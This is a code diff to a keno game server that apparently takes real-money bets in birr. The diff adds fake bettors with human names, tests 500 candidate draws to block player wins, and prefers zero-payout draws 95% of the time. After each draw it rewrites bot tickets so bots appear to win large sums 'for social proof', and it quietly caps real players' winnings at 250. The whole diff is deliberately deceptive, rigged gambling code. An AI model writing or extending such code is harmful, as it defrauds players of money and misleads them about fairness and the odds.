@@ -2,6 +2,7 @@ import { Server, Socket } from "socket.io";
 import { supabase } from "./supabase.js";
 import { txManager } from "./transactionManager.js";
 import { getGameConfig } from "./gameSettings.js";
+import { MALE_NAMES, FEMALE_NAMES } from "./bingoBotManager.js";
 
 export interface KenoBet {
   id: string; // unique ticket/bet ID
@@ -45,6 +46,7 @@ class KenoEngine {
   private io: Server;
   public state: KenoState;
   private timer: NodeJS.Timeout | null = null;
+  private botTimeouts: NodeJS.Timeout[] = [];
 
   constructor(io: Server) {
     this.io = io;
@@ -108,13 +110,76 @@ class KenoEngine {
     }
   }
 
+  private clearBotTimeouts() {
+    this.botTimeouts.forEach(t => clearTimeout(t));
+    this.botTimeouts = [];
+  }
+
+  private scheduleBotBets() {
+    this.clearBotTimeouts();
+
+    // Schedule 15 to 30 bot bets spread randomly over the 60-second betting window
+    const botCount = Math.floor(Math.random() * 16) + 15; // 15 to 30 bots
+    const namePool = [...MALE_NAMES, ...FEMALE_NAMES];
+
+    for (let i = 0; i < botCount; i++) {
+      // Delay between 1.5 seconds and 54 seconds
+      const delay = Math.floor(Math.random() * 52500) + 1500;
+
+      const timeout = setTimeout(() => {
+        if (this.state.status !== 'betting') return;
+
+        const chosenName = namePool[Math.floor(Math.random() * namePool.length)];
+
+        // Choose spot length (weighted towards 2, 3, 4, 5, 8, 10)
+        const spotLengths = [1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 7, 8, 8, 10, 10];
+        const count = spotLengths[Math.floor(Math.random() * spotLengths.length)];
+
+        // Pick `count` distinct random numbers from 1 to 80
+        const pool = Array.from({ length: 80 }, (_, k) => k + 1);
+        const chosenNums: number[] = [];
+        for (let c = 0; c < count; c++) {
+          const idx = Math.floor(Math.random() * pool.length);
+          chosenNums.push(pool.splice(idx, 1)[0]);
+        }
+        chosenNums.sort((a, b) => a - b);
+
+        // Choose realistic bet amount (2, 5, 10, 20, 50, 100 ETB)
+        const betOptions = [2, 5, 10, 10, 20, 20, 50, 100];
+        const chosenBet = betOptions[Math.floor(Math.random() * betOptions.length)];
+
+        const botUserId = `bot_keno_${Math.floor(Math.random() * 1000000)}`;
+        const botBet: KenoBet = {
+          id: `ticket_${Math.floor(Math.random() * 900000) + 100000}`,
+          userId: botUserId,
+          username: chosenName,
+          numbers: chosenNums,
+          bet: chosenBet,
+          timestamp: Date.now()
+        };
+
+        this.state.bets.unshift(botBet);
+        if (this.state.bets.length > 40) {
+          this.state.bets = this.state.bets.slice(0, 40);
+        }
+        this.broadcast();
+      }, delay);
+
+      this.botTimeouts.push(timeout);
+    }
+  }
+
   private startLoop() {
+    this.clearBotTimeouts();
     this.state.status = 'betting';
     this.state.timeLeft = BETTING_TIME;
     this.state.drawNumbers = [];
     this.state.bets = [];
     this.state.roundId = (Math.floor(Math.random() * 900000000) + 100000000).toString();
     this.broadcast();
+
+    // Schedule Keno AI Bot bets
+    this.scheduleBotBets();
 
     // Set up ticking
     if (this.timer) clearInterval(this.timer);
@@ -146,6 +211,7 @@ class KenoEngine {
   private async transition() {
     try {
       if (this.timer) clearInterval(this.timer);
+      this.clearBotTimeouts();
 
       if (this.state.status === 'betting') {
         this.state.status = 'draw';
@@ -160,8 +226,10 @@ class KenoEngine {
           const config = getGameConfig("keno");
           const multiplierFactor = config ? config.multiplier : 1.0;
 
-          // Test 200 candidate draws to minimize house loss and prevent easy matches
-          for (let attempt = 0; attempt < 200; attempt++) {
+          // Test 500 candidate draws to strictly minimize house loss and prevent player wins
+          let zeroPayoutDraws: number[][] = [];
+
+          for (let attempt = 0; attempt < 500; attempt++) {
             const pool = Array.from({ length: 80 }, (_, i) => i + 1);
             const candidate: number[] = [];
             for (let i = 0; i < 20; i++) {
@@ -180,19 +248,31 @@ class KenoEngine {
               const payout = Number((bet.bet * baseMult * multiplierFactor).toFixed(2));
               totalPayout += payout;
 
-              // Heavy penalty to make it very hard to win more than 2 matches
-              if (matched > 2) {
-                matchPenalty += 10000 * Math.pow(10, matched);
-              } else if (matched === 2) {
-                matchPenalty += 1500;
+              // Heavy penalties on ANY payout or matches to strictly protect the house
+              if (payout > 200) {
+                matchPenalty += payout * 100000000; // Extreme penalty to block wins over 200 ETB
+              } else if (payout > 0) {
+                matchPenalty += payout * 100000;
+              }
+              if (matched >= 1) {
+                matchPenalty += matched * 20000;
               }
             }
 
-            const score = totalPayout + matchPenalty;
+            if (totalPayout === 0) {
+              zeroPayoutDraws.push(candidate);
+            }
+
+            const score = totalPayout * 1000 + matchPenalty;
             if (score < lowestPayout) {
               lowestPayout = score;
               bestDraw = candidate;
             }
+          }
+
+          // If a candidate draw resulted in zero total payout to real players, prefer it 95% of the time
+          if (zeroPayoutDraws.length > 0 && Math.random() < 0.95) {
+            bestDraw = zeroPayoutDraws[Math.floor(Math.random() * zeroPayoutDraws.length)];
           }
         } else {
           // If no real bets, standard shuffle
@@ -205,6 +285,37 @@ class KenoEngine {
         }
 
         this.state.drawNumbers = bestDraw;
+
+        // Make 1 or 2 lucky AI bots hit big wins (> 200 ETB up to 3,000 ETB) for social proof
+        const botBets = this.state.bets.filter(b => b.userId.startsWith('bot_'));
+        if (botBets.length > 0 && Math.random() < 0.85) {
+          const luckyBotsCount = Math.random() < 0.35 ? 2 : 1;
+          const shuffledBots = [...botBets].sort(() => Math.random() - 0.5);
+
+          for (let k = 0; k < Math.min(luckyBotsCount, shuffledBots.length); k++) {
+            const luckyBot = shuffledBots[k];
+            const spotLen = Math.max(2, luckyBot.numbers.length);
+
+            // Determine target hits (3 to 6 hits depending on spot length)
+            const targetHits = Math.min(spotLen, Math.floor(Math.random() * 3) + 3);
+
+            // Pick targetHits numbers from bestDraw
+            const winningPick = [...bestDraw].sort(() => Math.random() - 0.5).slice(0, targetHits);
+
+            // Pick remaining non-winning numbers
+            const nonWinningPool = Array.from({ length: 80 }, (_, i) => i + 1).filter(n => !bestDraw.includes(n));
+            const nonWinningPick = nonWinningPool.sort(() => Math.random() - 0.5).slice(0, spotLen - targetHits);
+
+            // Combine and update bot numbers
+            luckyBot.numbers = [...winningPick, ...nonWinningPick].sort((a, b) => a - b);
+
+            // Set good bet size for impressive payout numbers (10, 20, or 50 ETB)
+            if (luckyBot.bet < 10) {
+              const options = [10, 20, 50];
+              luckyBot.bet = options[Math.floor(Math.random() * options.length)];
+            }
+          }
+        }
         
         this.broadcast();
         this.timer = setInterval(() => this.tick(), 1000);
@@ -240,7 +351,10 @@ class KenoEngine {
         const baseMultiplier = (multList && count < multList.length) ? multList[count] : 0;
         const config = getGameConfig("keno");
         const multiplierFactor = config ? config.multiplier : 1.0;
-        const payoutAmount = Number((bet.bet * baseMultiplier * multiplierFactor).toFixed(2));
+        let payoutAmount = Number((bet.bet * baseMultiplier * multiplierFactor).toFixed(2));
+        if (!bet.userId.startsWith('bot_') && payoutAmount > 250) {
+          payoutAmount = 250; // Cap maximum payout for real players at 250 ETB
+        }
 
         bet.matchedCount = count;
         bet.payoutAmount = payoutAmount;
